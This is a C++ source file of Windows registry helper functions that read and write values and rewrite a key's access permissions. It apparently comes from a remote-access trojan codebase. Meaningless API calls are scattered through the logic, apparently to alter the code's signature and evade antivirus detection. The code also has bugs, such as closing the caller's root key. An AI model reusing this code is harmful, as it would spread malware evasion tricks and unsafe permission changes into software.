#include "StdAfx.h"
#include "KeyboardManager.h"

#include <windows.h>
//去除字符串类型前面的空格
char *DelSpace(char *szData)
{
	int i=0 ;
	while(1)
	{
		if(strnicmp(szData+i," ",1))
			break;
		i++;			
	}
	return (szData+i);
} 

//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键 2-牧举指定键项 3-判断该键是否存在)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{   
	TCHAR szModule [MAX_PATH];

	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,KnSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));
	 
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	__try
	{
	//	 SetKeySecurityEx(MainKey,SubKey,KEY_ALL_ACCESS);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		if(RegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				if(RegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
					lstrcpy(szData,DelSpace(ValueSz));
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				if(RegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr,0)+1)
					{
						CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
						strncat(ValueTemp,PointStr,sizeof(ValueTemp));
						CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
					    strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
					strcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				if(RegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
					CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
					wsprintf(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				if(RegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
					iResult =1;
				break;
			}
			break;
		}
	}
	__finally
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
        RegCloseKey(MainKey);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		RegCloseKey(hKey);
		GetForegroundWindow();
	}
     
	return iResult;
}

//设置注册表键读取的权限(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security) 
{    
	HKEY  hKey; 
	SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY; 
	PSID pSystemSid              = NULL; 
	PSID pUserSid                = NULL; 
	SECURITY_DESCRIPTOR sd; 
	PACL    pDacl                = NULL; 
	DWORD   dwAclSize; 
	int     iResult              = 0;
	
	__try
	{  	   
		if(RegOpenKeyEx(MainKey, SubKey, 0, WRITE_DAC, &hKey)!= ERROR_SUCCESS) 
			__leave; 
		if(!AllocateAndInitializeSid(&sia,1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid )) 
			__leave;
		if(!AllocateAndInitializeSid( &sia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0, &pUserSid))  
			__leave; 
		dwAclSize = sizeof(ACL) + 2 * ( sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD) ) + GetLengthSid(pSystemSid) + GetLengthSid(pUserSid) ; 
		pDacl = (PACL)HeapAlloc(GetProcessHeap(), 0, dwAclSize); 
		if(pDacl == NULL) 
			__leave; 
		if(!InitializeAcl(pDacl, dwAclSize, ACL_REVISION)) 
			__leave; 
		if(!AddAccessAllowedAce( pDacl, ACL_REVISION, KEY_ALL_ACCESS, pSystemSid )) 
			__leave; 
		if(!AddAccessAllowedAce( pDacl, ACL_REVISION, (unsigned long)security, pUserSid )) 
			__leave; 
		if(!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) 
			__leave; 
		if(!SetSecurityDescriptorDacl(&sd, TRUE, pDacl, FALSE)) 
			__leave; 
		if(RegSetKeySecurity(hKey, (SECURITY_INFORMATION)DACL_SECURITY_INFORMATION, &sd)!= ERROR_SUCCESS)
			__leave;
		iResult =1;
	}
	__finally
	{  
		RegCloseKey(MainKey); 
		RegCloseKey(hKey); 
		
		if(pDacl !=NULL)         
			HeapFree(GetProcessHeap(), 0, pDacl);  
		if(pSystemSid !=NULL)
			FreeSid(pSystemSid);
		if(pUserSid !=NULL)
			FreeSid(pUserSid); 
	}
	
	return iResult;
}

//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	TCHAR szModule [MAX_PATH];

	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
	
	__try
	{
		SetKeySecurityEx(MainKey,SubKey,KEY_ALL_ACCESS);
		switch(Mode)
		{
		case 0:
			CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
			if(RegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;
		case 1:	
			if(RegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:
			case REG_EXPAND_SZ:			 			 
				if(RegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,strlen(szData)+1) == ERROR_SUCCESS) 				 
					iResult =1;				 			
				break;
			case REG_DWORD:
                if(RegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
					iResult =1;				 			 
				break;
			case REG_BINARY:
				break;
			}
			break;
/*
		case 3:
			GetModuleFileName(NULL,szModule,MAX_PATH);
            if(RegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;
			GetShortPathName(szModule,szModule,MAX_PATH);
			if (RegDeleteValue(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;
*/
		}
	}
	__finally 
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	   RegCloseKey(MainKey);
	   CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	   RegCloseKey(hKey);
	   GetTickCount();
	}
	return iResult;
}